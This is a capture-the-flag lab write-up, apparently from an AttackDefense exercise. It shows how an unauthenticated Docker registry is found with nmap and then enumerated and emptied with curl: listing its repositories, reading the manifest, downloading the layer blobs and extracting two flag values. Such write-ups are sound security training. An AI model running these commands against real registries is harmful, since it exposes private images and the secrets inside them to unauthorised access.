#### 5. Insecure Docker Registry IV

----

- An unprotected private Docker registry is on the same network as your Kali machine. There is only one docker image present in the registry which contains the flag. However, while building the image, the administrator has overwritten the initial flag with a newer flag.
- Objective: Fetch the image from the private Docker registry, analyze it and retrieve the flags!  No docker clients are provided and this exercise needs to be solved using first principles using curl.

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2442: eth0@if2443: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.7/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
2445: eth1@if2446: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:ce:b4:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.206.180.2/24 brd 192.206.180.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap -sC -sV 192.206.180.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 06:58 UTC
Nmap scan report for tuxala0b8dg8nm9rf436tnskv.temp-network_a-206-180 (192.206.180.3)
Host is up (0.000013s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
MAC Address: 02:42:C0:CE:B4:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.206.180.3:5000
```

```sh
root@attackdefense:~# curl http://192.206.180.3:5000/v2/_catalog
{"repositories":["trusted-image"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.206.180.3:5000/v2/trusted-image/tags/list
{"name":"trusted-image","tags":["latest"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.206.180.3:5000/v2/trusted-image/manifests/latest
{
   "schemaVersion": 1,
   "name": "trusted-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:0b750d960c68ad4d44171adf868a5adcabfa125fa05e439ef55725a4d16b0e79"
      },
      {
         "blobSum": "sha256:38805ce87d7ac41f51e41476fa150deb25c48afd42cebe4e131759b525581b1c"
      },
      {
         "blobSum": "sha256:f4b3e547056147fc7279cd6444da4265751543adfaf65e2160783e16904a5892"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"ArgsEscaped\":true,\"Image\":\"sha256:e7de60dc0f34d7e607161a1f998c1c7a3e85bd003edccd7b41f60b380cbac210\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) COPY file:a34dbe44e203793cb20acf78e40720ac86b740ba4e24bf334dc9e778d3102c0b in /tmp/flag.txt \"],\"ArgsEscaped\":true,\"Image\":\"sha256:e7de60dc0f34d7e607161a1f998c1c7a3e85bd003edccd7b41f60b380cbac210\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2019-05-14T12:47:19.824431534Z\",\"docker_version\":\"18.09.4\",\"id\":\"c2162e552ec589b6a87ef8801c82ecd92ad51ea0bb5577a11ed85c240c83e471\",\"os\":\"linux\",\"parent\":\"dc4a00ebd48269a05ef33feb9b9c5893002fe74f41f434b3452ae8e065606031\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"dc4a00ebd48269a05ef33feb9b9c5893002fe74f41f434b3452ae8e065606031\",\"parent\":\"b63a347c40285bf8192764c86819267af601049aa226295b4168827f35ea34c2\",\"created\":\"2019-05-14T12:47:19.502947433Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apk add wget curl\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"b63a347c40285bf8192764c86819267af601049aa226295b4168827f35ea34c2\",\"parent\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\",\"created\":\"2019-05-14T12:47:17.504675995Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:b9e89ec6ad3336511e590bdf4056b804359d24c4291022cfa951acd7aa69e1e8 in /tmp/ \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\",\"parent\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.510395965Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\",\"created\":\"2019-05-11T00:07:03.358250803Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "V67A:JIXE:2UUZ:LUEQ:JGOQ:GOYB:AG4U:4QFZ:FZJY:4CKN:EOI4:7JBT",
               "kty": "EC",
               "x": "yzR7fE8SjjQZhDutzkzXUz4p4WXYM_EYcLABXLjknmk",
               "y": "W-7jOND60HZT7SRgx7qcMjV6E8C9p6tl1U7_Mr-t3vE"
            },
            "alg": "ES256"
         },
         "signature": "bGtCePQomeChfSYTCxSjCkGxccV-9YycpBkTwKHQH02XgEAmnNO-NkS0aVH9ZtOkzl8_4j_OuhoGik_oDbKtYg",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjM0ODMsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0wNy0yNFQwNzowMzozMVoifQ"
      }
   ]
}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl -s 192.206.180.3:5000/v2/trusted-image/blobs/sha256:0b750d960c68ad4d44171adf868a5adcabfa125fa05e439ef55725a4d16b0e79 --output 5.tar
```

```sh
root@attackdefense:~# mkdir compress
root@attackdefense:~# mv 5.tar compress/
root@attackdefense:~# cd compress/
root@attackdefense:~/compress# tar xf 5.tar
root@attackdefense:~/compress# ls -l
total 8
-rw-r--r-- 1 root root  162 Jul 24 07:14 5.tar
drwxrwxrwt 2 root root 4096 May 14 12:47 tmp
root@attackdefense:~/compress# cd tmp/
root@attackdefense:~/compress/tmp# ls -l
total 4
-rw-r--r-- 1 root root 33 May 14 12:47 flag.txt
root@attackdefense:~/compress/tmp# cat flag.txt
f95bb8b782fd38359195d247b3265479
root@attackdefense:~/compress/tmp#
```

```sh
root@attackdefense:~# curl -s 192.206.180.3:5000/v2/trusted-image/blobs/sha256:38805ce87d7ac41f51e41476fa150deb25c48afd42cebe4e131759b525581b1c --output 4.tar
```

```sh
root@attackdefense:~# mv 4.tar compress/
root@attackdefense:~# cd compress/
root@attackdefense:~/compress# tar xf 4.tar
root@attackdefense:~/compress# ls -l
total 2308
-rw-r--r-- 1 root root 2346451 Jul 24 07:17 4.tar
drwxr-xr-x 5 root root    4096 May 14 12:47 etc
drwxr-xr-x 3 root root    4096 May  9 20:49 lib
drwxr-xr-x 7 root root    4096 May  9 20:49 usr
drwxr-xr-x 3 root root    4096 May  9 20:49 var
root@attackdefense:~/compress# find . -name *flag* 2>/dev/null
```

```sh
root@attackdefense:~# curl -s 192.206.180.3:5000/v2/trusted-image/blobs/sha256:f4b3e547056147fc7279cd6444da4265751543adfaf65e2160783e16904a5892 --output 3.tar
```

```sh
root@attackdefense:~# mv 3.tar compress/
root@attackdefense:~# cd compress/
root@attackdefense:~/compress# ls -l
total 4
-rw-r--r-- 1 root root 162 Jul 24 07:20 3.tar
root@attackdefense:~/compress# tar xf 3.tar
root@attackdefense:~/compress# ls -l
total 8
-rw-r--r-- 1 root root  162 Jul 24 07:20 3.tar
drwxrwxrwt 2 root root 4096 May 14 12:47 tmp
root@attackdefense:~/compress# cd tmp/
root@attackdefense:~/compress/tmp# cat flag.txt
b669b995993dc46651989e4856b7bebe
root@attackdefense:~/compress/tmp#
```

- Initial Flag &rarr; `b669b995993dc46651989e4856b7bebe`
- Final Flag &rarr; `f95bb8b782fd38359195d247b3265479`

----

EOF